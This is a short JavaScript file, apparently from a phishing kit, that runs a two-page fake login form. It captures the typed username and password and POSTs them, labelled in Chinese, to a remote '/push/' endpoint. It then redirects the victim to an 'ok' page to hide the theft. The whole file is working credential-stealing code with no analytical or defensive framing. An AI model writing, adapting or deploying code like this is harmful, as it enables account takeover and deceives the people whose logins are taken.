var username = null;
var password = null;

function login_username() {
    username = document.getElementById('usersname').value;
    document.getElementById('page_1').style.display = 'none';
    document.getElementById('page_2').style.display = 'block';
}
function login_password() {
    password = document.getElementById('password').value;
    var url = window.location.href;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', remote+"/push/"+url.substring(remote.length).replace("/","")+"/", true);
    xhr.send(JSON.stringify({"content":"用户名: "+username+" 密码: "+password}));

    xhr.onload = function() {
        window.location.href = "/resource/other/ok.html"
    };
}
function back() {
    document.getElementById('page_1').style.display = 'block';
    document.getElementById('page_2').style.display = 'none';
}